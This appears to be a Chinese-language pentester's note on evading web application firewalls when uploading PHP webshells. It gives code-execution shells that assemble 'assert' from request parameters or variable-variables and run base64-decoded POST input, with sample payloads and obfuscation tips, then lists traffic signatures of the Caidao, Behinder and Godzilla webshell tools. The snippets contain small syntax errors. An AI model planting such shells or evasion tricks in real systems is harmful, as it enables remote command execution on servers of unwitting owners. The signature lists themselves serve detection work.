# webshell上传免杀

## 1.代码免杀

WAF会对上传文件内容中敏感命令进行识别阻止访问，例eval

### 1.php传参带入

```php
<?php
$a=$_GET['a'];
$aa=$a.'ert';
$aa(base64_decode($_POST['x']));
>
```

payload:

```payload
?a=ass
x=cGhwaW5mbygpOw==
```

`cGhwaW5mbygpOw==`是phpinfo();进过base64加密的，waf可能会对phpinfo()进行检测，此处assert的作用和eval是相同的，但是eval在此处无法执行

### 2.php变量覆盖

```php
<?php
$a='b';
$b='assert';
$$a(base64_decode($_POST['x']);
>
```

pyload

```
x=cGhwaW5mbygpOw==
```

### 3.php加密变异

http://www.phpjm.net/

使用在线加密网站

### 4.php异或绕过，无字母数字绕过

通过两个字符异或可以得到想要的字符

### 5.使用现成的工具进行对代码的混淆

## 2.流量特征

### 1.菜刀

#### 2、特征：

```
数据包流量特征：

1，请求包中：ua头为百度爬虫

2，请求体中存在eval，base64等特征字符

3，请求体中传递的payload为base64编码，并且存在固定的QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J
```



### 2.冰蝎

消息体内容采用 AES 加密，基于特征值检测的安全产品无法查出。

#### 特征：

默认密码为`rebeyond`

```
0、User-agent：代码中定义

1、Pragma: no-cache

2、Content-Type：application/x-www-form-urlencoded

3、Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

4、Accept-Encoding: gzip, deflate, br

5、Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
```

### 3.哥斯拉

#### 1、特征：

```
1、User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0

2、Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

3、Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

4、Cookie: PHPSESSID=rut2a51prso470jvfe2q502o44;  cookie最后面存在一个";"
```

# webshell功能操作免杀

